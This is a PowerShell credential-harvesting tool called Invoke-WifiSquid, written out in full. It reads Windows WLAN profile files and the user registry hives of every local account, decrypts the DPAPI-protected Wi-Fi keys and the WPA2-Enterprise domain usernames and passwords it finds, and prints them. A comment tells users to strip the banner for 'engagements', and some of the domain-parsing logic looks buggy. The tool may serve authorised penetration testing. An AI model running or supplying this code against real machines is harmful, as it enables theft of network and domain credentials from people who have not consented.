# FUNCTION TO CONVERT A HEX STRING OF FORMAT "FF0A0B0C12" INTO A BYTE ARRAY
Add-type -AssemblyName System.Security;
Add-type -AssemblyName System.Text.Encoding;

class DomainCreds {
    [string] $Domain 
    [string] $Username 
    [string] $Password
    [bool] $Complete = $false 
}

# SLICE AN ARRAY
function Get-ByteArraySlice {

    [OutputType([byte[]])]
    param (
        [byte[]] $data,
        [int] $startIndex = -1,
        [int] $endIndex = -1
    )
    Write-Host "Slice called: ($($startIndex), $($endIndex))"

    if ($startIndex -lt 0) {
        Write-Host "Error: Slice start index cannot be < 0"
        $startIndex = 0;
    }
    if ($endIndex -lt 0 -or $endIndex -gt $data.Count) {
        Write-Host "Error: Slice end index may not be < 0 or > size"
        $endIndex = $data.Count;
    }
    if ($endIndex -lt $startIndex) {
        Write-Host "Error: Slice end index may not be < start index"
        return @()
    }

    [int] $sliceSize = $endIndex - $startIndex;
    [byte[]] $slice = @(0x00) * $sliceSize;

    # COPY DATA
    for ($i = 0; $i -lt $sliceSize; $i++) {
        [int] $currentIndex = $startIndex + $i;
        $slice[$i] = $data[$currentIndex];
    }
    Write-Host "Got Slice: $($slice); ($($startIndex), $($endIndex))"

    return $slice
}

function Find-SigScan {

    [OutputType([int])]
    param (
        [byte[]] $hayStack,
        [byte[]] $needle, 
        [int] $startAt = 0,
        [bool] $invert = $false
    )

    for ($i = $startAt; $i -lt $hayStack.length; $i++) {

        # LOOK FOR A MATCH
        [bool] $broken = $false;
        for ($j = 0; $j -lt $needle.length; $j++) {
            if ($invert) {
                if ($needle[$j] -eq $hayStack[$i + $j]) {
                    $broken = $true 
                    break;
                } 
            } else {
                if ($needle[$j] -ne $hayStack[$i + $j]) {
                    $broken = $true;
                    break;
                }
            }
        }

        if (!$broken) {
            return $i
        }
    }

    return -1
}

function Decrypt-DomainUsername {


    [OutputType([DomainCreds])]
    param (
        [byte[]] $unprotectedBytes
    )
    
    Write-Host "Attempting to decrypt domain credentials!"
    [DomainCreds] $domainCreds = [DomainCreds]::new()


    # CONSTANTS THAT WE USE TO SEARCH THROUGH THE BLOB FOR THE USERNAME
    # https://github.com/ash47/EnterpriseWifiPasswordRecover/blob/master/EnterpriseWifiPasswordRecover/Program.cs
    [byte[]] $searchForUsername = @(0x04, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00);
    [byte[]] $searchForUsername2 = @(0x03, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00);
    [byte[]] $nullArray = @(0x00);
    
    # SEARCH FOR USERNAME FIELD START
    [int] $usernameFieldStart = Find-Sigscan -hayStack $unprotectedBytes -needle $searchForUsername
    
    # IF THE USERNAME FIELD START IS FOUND, THEN LOOK FOR ITS END
    if ($usernameFieldStart -ne -1) {
        Write-Host "`tFound beginning of username field!: $($usernameFieldStart), $($unprotectedBytes[$usernameFieldStart])"

        $usernameFieldStart += $searchForUsername.Length;
        [int] $usernameFieldEnd = Find-SigScan -hayStack $unprotectedBytes -needle $nullArray -startAt $usernameFieldStart
        
        # IF THE END OF THE FIELD IS FOUND, GRAB IT
        if ($usernameFieldEnd -ne -1) {
            Write-Host "`tFound end of username field!: $($usernameFieldEnd)"

            [byte[]] $usernameField = Get-ByteArraySlice -data $unprotectedBytes -startIndex $usernameFieldStart -endIndex $usernameFieldEnd
            Write-Host "`tUsername field is $($usernameField.Length) bytes long"
            $domainCreds.Username = [System.Text.Encoding]::UTF8.GetString($usernameField);
            Write-Host "`tUsername: $($domainCreds.username). Looking for domain creds"
            # THEN, FIND THE DOMAIN START
            [int] $domainFieldStart = Find-SigScan -hayStack $unprotectedBytes -needle $nullArray -startAt ($usernameFieldEnd + 1) -invert $true;

            # CHECK FOR A DOMAIN. IF WE REACHED 0xE6 THEN NO DOMAIN WAS FOUND
            if ($domainFieldStart -ne -1 -and $unprotectedBytes[$domainFieldStart] -ne 0xE6) {

                Write-Host "Found beginning of domain field!"
                [int] $domainFieldEnd = Find-SigScan -hayStack $unprotectedBytes -needle $nullArray -startAt $domainFieldStart

                if ($domainFieldEnd -ne -1) {
                    Write-Host "Found the end of the domain field!"
                    [byte[]] $possibleDomainField = Get-ByteArraySlice -data $unprotectedBytes -startIndex $domainFieldStart -endIndex $domainFieldEnd
                    $domainCreds.Domain = [System.Text.Encoding]::UTF8.GetString($possibleDomainField);
                } else {
                    Write-Host "Failedt to find end of the domain field!"
                }
            } else {
                Write-Host "Failed to find beginning of domain field!"
            }
        } else {
            Write-Host "Failed to find end of username field!"
        }
    } else {
        
        Write-Host "`tFailed to find beginning of username field! Trying with different bytes"
        # IF IT'S NOT FOUND, MAYBE IT'S NOT ENCRYPTED
        $usernameFieldStart = Find-SigScan -hayStack $unprotectedBytes -needle $searchForUsername2
        Write-Host $usernameFieldStart

        if ($usernameFieldStart -ne -1) {

            # MAYBE WE DO ACTUALLY HAVE A DOMAIN?
            # SKIP NULL BYTES
            $usernameFieldStart += $searchForUsername2.Length;
            $usernameFieldStart = Find-SigScan -hayStack $unprotectedBytes -needle $nullArray -startAt $usernameFieldStart -invert $true 

            # FIND WHERE THE DOMAIN FIELD ENDS
            [int] $usernameFieldEnd = Find-SigScan -hayStack $unprotectedBytes -needle $nullArray -startAt ($usernameFieldEnd + 1) -invert $true
            [byte[]] $usernameField = Get-ByteArraySlice -data $unprotectedBytes -startIndex $usernameFieldStart -endIndex $usernameFieldEnd
            $domainCreds.Username = [System.Text.Encoding]::UTF8.GetString($usernameField)

            # LOOK FOR THE PASSWORD FIELD
            [int] $passwordFieldStart = Find-SigScan -hayStack $unprotectedBytes -needle $nullArray -startAt ($usernameFieldEnd + 1) -invert $true
            if ($passwordFieldStart -ne -1) {

                [int] $passwordFieldEnd = Find-SigScan -hayStack $unprotectedBytes -needle $nullArray -startAt ($passwordFieldStart + 1)
                if ($passwordFieldEnd -ne -1) {
                    [byte[]] $passwordField = Get-ByteArraySlice -data $unprotectedBytes -startIndex $passwordFieldStart -endIndex $passwordFieldEnd
                    $domainCreds.Password = [System.Text.Encoding]::UTF8.GetString($passwordField)
                    
                    # LOOK FOR THE DOMAIN FIELD
                    [int] $domainFieldStart = Find-SigScan -hayStack $unprotectedBytes -needle $nullArray -startAt ($passwordFieldEnd + 1) -invert $true
                    if ($domainFieldStart -ne -1) {
                        [int] $domainFieldEnd = Find-SigScan -hayStack $unprotectedBytes -needle $nullArray -startAt ($domainFieldStart + 1)
                        if ($domainFieldEnd -ne -1) {
                            [byte[]] $domainField = Get-ByteArraySlice -data $unprotectedBytes -startIndex $passwordFieldStart -endIndex $passwordFieldEnd
                            if ($domainField[0] -ne 0x01) {
                                $domainCreds.Password = [System.Text.Encoding]::UTF8.GetString($domainField);
                                $domainCreds.Complete = $true
                            }
                        }
                    }
                }
            } 
        }
        else {
            Write-Host "Failed to find username field!"
        }
    }

    return $domainCreds


}

function Decrypt-DomainPassword {
    [OutputType([DomainCreds])]
    param (
        [byte[]] $unprotectedBytes,
        [DomainCreds] $domainCreds
    )

    [byte[]] $searchForPassword = @( 0x01, 0x00, 0x00, 0x00, 0xD0, 0x8C, 0x9D, 0xDF, 0x01)

    # CHECK FOR THE ENCRYPTED DATA CHUNK
    [int] $passwordFieldStart = Find-SigScan -hayStack $unprotectedBytes -needle $searchForPassword
    if ($passwordFieldStart -ne -1) {
        Write-Host "`tFound password blob!"

        try {
            # TRY TO UNPROTECT THE PASSWORD - NEEDS TO BE RUN AS THE USER IN QUESTION
            Write-Host "Trying to unprotect password"
            [byte[]] $unprotectedPassword = [System.Security.Cryptography.ProtectedData]::Unprotect($unprotectedBytes, $null, [System.Security.Cryptography.DataProtectionScope]::LocalMachine);

            # STRIP NULL BYTES
            for ($i = 0; $i -lt $unprotectedPassword.Length; $i++) {
                if ($unprotectedPassword[$i] -eq 0x00) {
                    Write-Host "Trimming null bytes from decrypted password"
                    $unprotectedPassword = Get-ByteArraySlice -data $unprotectedPassword -startIndex 0 -endIndex $i 
                    break;

                }
            }

            $domainCreds.Password = [System.Text.Encoding]::UTF8.getString($unprotectedPassword)
            $domainCreds.Complete = $true 
            return $domainCreds
        }
        catch {
            Write-Host "An error occurred: $($_) - Most likely you need to run this as the user who owns the password"
            Write-Host "Trying a workaround to impersonate the target user with a scheduled task! This may take a few seconds..."
            return $domainCreds
        }
    } else {
        Write-Host "`tCould not find the start of the password field!"
    }
    return $domainCreds
}
# ENUM
enum WifiNetworkCredType {
    Unknown
    Password
    Domain
}
# CLASS FOR NETWORK
class WifiNetwork {
    [string] $GUID
    [string] $SSID 
    [string] $DecryptedKey
    [WifiNetworkCredType] $CredType
    [string] $KeyMaterial
    [string] $IsProtected
}

# STORE NETWORKS
[WifiNetwork[]] $foundNetworks = @();
[WifiNetwork[]] $notFoundNetworks = @();

Write-Host @"

                        ___
                    .-'   ``'.
                    /         \
                    |         ;
                    |         |           ___.--,
           _.._     |0) ~ (0) |    _.---'``__.-( (_.
    __.--'``_.. '.__.\    '--. \_.-' ,.--'``     ``""``
   ( ,.--'``   ',__ /./;   ;, '.__.'``    __
  _``) )  .---.__.' / |   |\   \__..--""  """--.,_
``---' .'.''-._.-'``_./  /\ '.  \ _.-~~~````````~~~-._``-.__.'
       | |  .' _.-' |  |  \  \  '.               ``~---``
       \ \/ .'      \  \   '. '-._)
        \/ /         \  \    ``=.__``~-.
        / /\         ``) )    / / ``"".``\
   , _.-'.'\ \       / /    ( (     / /
  ``--~``   ) )     .-'.'      '.'.  | (
           (/``    ( (``          ) )  '-;
            ``      '-;         (-'

"@;
# PLEASE STRIP THIS BANNER IF YOU WANT TO USE THIS ON AN ENGAGEMENT :)
Write-Host "Invoke-WifiSquid by @0xblacklight`n";
Write-Host "This tool was developed for research and demonstration purposes only!"
Write-Host "Please use it in a legal and responsible manner only. "

# GRAB THE WIFI CONFIG XML FILES AND LOOP OVER THEM. SUPPY DIRECTORY NAME IN VARIABLE
# TODO: ALLOW COMMAND LINE ARG TO SPECIFY 
$dirName = "C:\programdata\Microsoft\Wlansvc\Profiles\Interfaces" # INTERFACES LIST

# FIND INTERFACE DIRECTORIES
$ifaceFolders = Get-ChildItem $dirName;
for ($i = 0; $i -lt $ifaceFolders.Count; $i++) {

    $fullPathToConfigs = "$($dirName)\$($ifaceFolders[$i])";
    Write-Host "Found full path to interface folder: $($fullPathToConfigs)`n";

    # FIND XML FILES
    Write-Host "Found XML Files:";
    $networkConfigs = Get-ChildItem $fullPathToConfigs;

    # LOOP THROUGH NETWORK CONFIGS IN WINDOWS DIR
    for ($j = 0; $j -lt $networkConfigs.Count; $j++) {

        $fullPathToConfig = "$($fullPathToConfigs)\$($networkConfigs[$j])"
        Write-Host "`t$($networkConfigs[$j])";

        $network = [WifiNetwork]::new();

        # PARSE XML AND GET THE CONFIG
        [xml]$wifiConfig = Get-Content $fullPathToConfig;
        $pattern = '(?<=\{).+?(?=\})'
        $network.GUID = [regex]::Matches($networkConfigs[$j], $pattern).Value
        $network.SSID = $wifiConfig.WLANProfile.name;
        
        if ($wifiConfig.WLANProfile.MSM.security.sharedKey.keyType) {
            $network.CredType = [WifiNetworkCredType]::Password
        } else {
            $network.CredType = [WifiNetworkCredType]::Unknown
        }
        $network.IsProtected = $wifiConfig.WLANProfile.MSM.security.sharedKey.protected;
        $network.KeyMaterial = $wifiConfig.WLANProfile.MSM.security.sharedKey.keyMaterial;

        # IF THERE'S KEY MATERIAL, THEN DECRYPT IT AND ADD IT TO FOUND ONES. OTHERWISE, ADD IT TO THE LIST OF NOT FOUND ONES THAT WE'LL COME BACK TO 
        if ($network.KeyMaterial) {
            $keyBytes = [byte[]] ($network.KeyMaterial -replace '^0x' -split '(..)' -ne '' -replace '^', '0x');
            try {
                $decryptedNetworkKeyBytes = [System.Security.Cryptography.ProtectedData]::Unprotect($keyBytes, $null, [System.Security.Cryptography.DataProtectionScope]::LocalMachine);
                $network.DecryptedKey = [System.Text.Encoding]::UTF8.GetString($decryptedNetworkKeyBytes);
            }
            catch [System.Security.Cryptography.CryptographicException] {
                #Write-Host "`t`tAn error occurred for network $($network.SSID) ($($network.GUID)): $($_)";
            }
            
            $foundNetworks += $network;
        }
        else {
            $notFoundNetworks += $network
        }
    }

}

# MOUNT HKEY_USERS
New-PSDrive -Name HKU Registry HKEY_USERS;

# NOW, FOR ANY NETWORKS WE COULDN'T FIND KEYS FOR, LET'S GO THROUGH THE REGISTRY AND LOOK FOR THEM
# BUILD A LIST OF LOCAL USERS
$users = Get-LocalUser;

$hives = @( "HKCU", "HKLM");

# MOUNT USERS REGISTRIES AS user:\
foreach ($u in $users) {
    $user = New-Object System.Security.Principal.NTAccount($u.Name);
    $hives += $u.name;
    $sid = $user.Translate([System.Security.Principal.SecurityIdentifier]).value;
    Write-Host "Found user $($u.Name) - $($sid)";

    # CAN GRAB THE USER'S HIVE THEN BY DOING Get-Item "HKU:\${sid}"
        
    $hives += "HKU:\$($sid)"
        
}

# CREATE LIST OF HIVES
[string[]] $regKeys = @("\Software\Microsoft\Wlansvc\UserData\Profiles", "\Software\Microsoft\Wlansvc\Profiles");

# THIS WILL BE THE CASE FOR WPA2-ENTERPRISE (DEFINITELY) AND PEAP (POSSIBLY)
for ($a = 0; $a -lt $notFoundNetworks.Count; $a++) {

    [WifiNetwork] $network = $notFoundNetworks[$a];
        
    # LOOP THROUGH HIVES, AND CHECK EACH OF THE regKeys
    foreach ($hive in $hives) {
        foreach ($key in $regKeys) {
                
            $path = "$($hive)$($key)\{$($network.GUID)}"

            # IF THE PATH EXISTS, GRAB THE KEY AND DECRYPT
            if (Test-Path $path) {
                
                # UPDATE THE NETWORK KEY TYPE TO DOMAIN SINCE WE FOUND DOMAIN CREDS
                $network.CredType = [WifiNetworkCredType]::Domain

                Write-Host "Found key at $($path)"

                # GET DPAPI PROTECTED BLOB
                [byte[]] $protectedKey = (Get-ItemProperty $path).MSMUserData;
                [byte[]] $unprotectedKey = @();
                try {

                    # TRY TO UNPROTECT
                    $unprotectedKey = [System.Security.Cryptography.ProtectedData]::Unprotect($protectedKey, $null, [System.Security.Cryptography.DataProtectionScope]::LocalMachine);
                    
                    # THEN, DECRYPT/DECIPHER IT FROM THE WEIRD FORMAT
                    [DomainCreds] $domainCreds = Decrypt-DomainUsername -unprotectedBytes $unprotectedKey
                    Write-Host $domainCreds
                    $domainCreds = Decrypt-DomainPassword -unprotectedBytes $unprotectedKey -domainCreds $domainCreds
                    Write-Host $domainCreds
                    if ($domainCreds.Domain) {
                        $network.DecryptedKey = "$($domainCreds.Domain)\$($domainCreds.Username):$($domainCreds.Password)"
                    } else {
                        $network.DecryptedKey = "$($domainCreds.Username):$($domainCreds.Password)"
                    }

                    $network.Domain

                    $foundNetworks += $network

                } catch {
                    Write-Host "`tFailed to Decrypt key! $($_)"
                }

                Write-Host "Finished decrypting key!"
                break;

                
            }
        }
    }
        

        

}

# PRINT THE NETWORKS WE FOUND
for ($a = 0; $a -lt $foundNetworks.Count; $a++) {
    [WifiNetwork] $network = $foundNetworks[$a]
    Write-Host "Got key for network: $($network.SSID): $($network.DecryptedKey)";
}
Write-Host "";

# PRINT THE NETWORKS WE DIDN'T FIND
for ($a = 0; $a -lt $notFoundNetworks.Count; $a++) {
    [WifiNetwork] $network = $notFoundNetworks[$a]
    Write-Host "Failed to get key for network $($network.SSID) :(";
}


